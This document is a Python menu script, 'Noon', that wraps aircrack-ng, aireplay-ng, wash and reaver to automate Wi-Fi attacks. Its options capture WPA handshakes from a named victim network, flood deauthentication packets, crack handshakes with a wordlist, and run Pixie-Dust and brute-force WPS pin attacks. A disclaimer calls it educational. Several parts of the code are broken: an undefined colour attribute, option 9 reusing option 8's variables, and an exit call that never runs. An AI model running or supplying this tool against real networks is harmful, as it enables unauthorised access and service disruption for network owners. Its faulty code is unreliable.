#!/usr/bin/python #
# -*- coding: utf-8 -*- #
# Made by cristi092. #

### 30000040005 ###

# Disclaimer comment. #

'''

        .                 .
      .´  ·  .       .  ·  `.   [!] Noon - Version 0.1.
      :  :  :   (¯)   :  :  :   [!] Author - cristi092.
      `.  ·  `  /¯\  ´  ·  .´   [!] Multi-Use Wireless Auditor.
        `      /¯¯¯\     ´


 [!] This tool is meant to automate Wi-Fi Attacks and Scans.

 [!] This tool is meant for research purposes only,
   and any malicious usage of this tool is prohibited.

 [!] For the script to properly run, you must have Kali Linux installed,
   or any other Debian based distro with Kali repositories added.

 [!] LICENSE:
   This software is distributed under the GNU General Public License Version 3 (GPLv3).

 [!] LEGAL NOTICE:
   THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
   IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY,
   THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
   BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.

'''

### 11410151718 ###

# External library importing. #

import os
import sys
import time
import subprocess

# Defining color class. #

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
# Banner printing. #    
    
print(f"""\{bcolors.OKGREEN}

    .                 .
  .´  ·  .       .  ·  `.   {bcolors.BOLD} [!] Noon - Version 0.1. {bcolors.ENDC}
  :  :  :   (¯)   :  :  :   {bcolors.OKBLUE} [!] Author - cristi092. {bcolors.ENDC}
  `.  ·  `  /¯\  ´  ·  .´   {bcolors.OKBLUE} [!] Multi-Use Wireless Auditor. {bcolors.ENDC}
    `      /¯¯¯\     ´

          {bcolors.ENDC}""")

# Time delay before entering the program. #

time.sleep(3)

# Warn the user to install the requirements. #

print(f"{bcolors.WARNING} [!] Please install ALL requirements from the [README] file, BEFORE running the script. {bcolors.ENDC} ")

time.sleep(1)

# Make sure the user has [ROOT] permissions. #
    
if os.geteuid() != 0:
    exit(f"{bcolors.FAIL} [!] You need to have root privileges to run this script. \n [!] Please try again, this time using 'sudo'. \n    [!] Exiting... {bcolors.ENDC} ")
    
time.sleep(3)

# Value declaring for the main loop. #

help1 = 'H'
help2 = 'h'
ask = 'True'

# Main loop. #

### 12821202029 ###

while ask == 'True':
    print(f"""\{bcolors.OKBLUE}

 [!] MAIN MENU - OPTIONS:
 ------------------------
 [1.] Check active interfaces.
 [2.] Enable Monitor Mode.
 ------------------------
 [3.] Scan WPS-Enabled AP's.
 [4.] Normal Wi-Fi A.P. Scan.
 ------------------------
 [5.] Capture a Handshake.
 [6.] Send deauthenticating packs.
 ------------------------
 [7.] Crack a WPA/WPA2 handshake.
 [8.] Pixie-Dust WPS Pin Attack.
 [9.] Reaver Brute-Force Pin to WPA Key.
 ------------------------
 [H.] Display Help Page.
 [0.] Exit... {bcolors.ENDC}
 
        """)
    
    time.sleep(2)

    main = input (f"{bcolors.BOLD} [*] Please choose an option: {bcolors.END}")
    if main == '1':
            print(f"{bcolors.OKGREEN} [*] Checking active interfaces... {bcolors.ENDC} ")
            time.sleep(2)
            subprocess.call(["iw", "dev"])
    elif main == '2':
            intf1 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
            time.sleep(2)
            print(f"{bcolors.OKGREEN} [*] Enabling monitor mode... {bcolors.ENDC}")
            subprocess.call(["sudo", "airmon-ng" , "check" , "kill"])
            subprocess.call(["sudo", "airmon-ng" , "start" , intf1])
            subprocess.call(["sudo", "ip" , "link" , "set" , intf1 , "up"])       
    elif main == '3':
            intf2 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
            time.sleep(2)
            print(f"{bcolors.OKGREEN} [*] Starting Wash Scan... {bcolors.ENDC}")
            time.sleep(1)
            subprocess.call(["sudo", "wash" , "-i" , intf2])    
    elif main == '4':
            intf3 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
            time.sleep(1)
            print(f"{bcolors.OKGREEN} [*] Starting Access Point Scan... {bcolors.ENDC}")
            time.sleep(1)
            subprocess.call(["sudo", "airodump-ng" , "-i" , intf3])    
    elif main == '5':
            intf4 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
            time.sleep(1)
            ch1 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.END}")
            time.sleep(1)
            bssid1 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}")
            time.sleep(1)
            svp1 = input(f"{bcolors.BOLD} [*] Please set the location to save the capture. [ex./usr/bin/...]: {bcolors.END}")
            time.sleep(1)
            subprocess.call(["sudo", "airodump-ng" , "-c" , ch1 , "--bssid" , bssid1 , "-w" , svp1 , intf4]) 
    elif main == '6':
            intf5 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
            time.sleep(1)
            np1 = input(f"{bcolors.BOLD} [*] Please set the number of packets to send. [0 for Packet Spam.]: {bcolors.END}")
            time.sleep(1)
            bssid2 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}")
            time.sleep(1)
            subprocess.call(["sudo", "aireplay-ng" , "-0" , np1 , "-a" , bssid2 , intf5])
    elif main == '7':
            bssid3 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}")
            time.sleep(1)
            hssvp2 = input(f"{bcolors.BOLD} [*] Please enter the [.cap] file's location. [ex./usr/bin/...]: {bcolors.END}")
            time.sleep(1)
            dic1 = input(f"{bcolors.BOLD} [*] Please enter the dictionary file's location. [ex./usr/bin/...]: {bcolors.END}")
            time.sleep(1)
            subprocess.call(["sudo", "aircrack-ng" , "-a2" , "-b" , bssid3 , "-w" , dic1 , hssvp2])
    elif main == '8':
            intf5 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
            time.sleep(1)
            ch2 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.END}")
            time.sleep(1)
            bssid4 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}") 
            time.sleep(1)
            subprocess.call(["sudo", "reaver" , "-i" , intf5 , "-b" , bssid4 , "-c" , ch2 , "-vvv" , "-K" , "1" , "-f"]) 
    elif main == '9':
            intf6 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
            time.sleep(1)
            ch3 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.END}")
            time.sleep(1)
            bssid5 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}") 
            time.sleep(1)
            pin1 = input(f"{bcolors.BOLD} [*] Please set the victim's WPS Pin: {bcolors.END}") 
            time.sleep(1)
            subprocess.call(["sudo", "reaver" , "-i" , intf5 , "-b" , bssid4 , "-c" , ch2 , "-p" , pin1]) 
    elif main == help1:
            print(f"""\{bcolors.BOLD}

    [#] Noon is a Multi-Use Wireless Auditor, 
        meant to automate Wireless attacks and
        increase efficiency while hacking.      
    [#] Noon - Version 0.1 - by cristi092. {bcolors.END}
    
                    """)
    elif main == help2:
            print(f"""\{bcolors.BOLD}

    [#] Noon is a Multi-Use Wireless Auditor, 
        meant to automate Wireless attacks and
        increase efficiency while hacking.      
    [#] Noon - Version 0.1 - by cristi092. {bcolors.END}
    
                    """)
    elif main == '0':
            print(f"{bcolors.OKGREEN} [*] Goodbye... {bcolors.ENDC}")
            sys.exit
    else:
            print(f"{bcolors.FAIL} [!] That is not a valid option. {bcolors.ENDC} ")

### 23231313738 ###
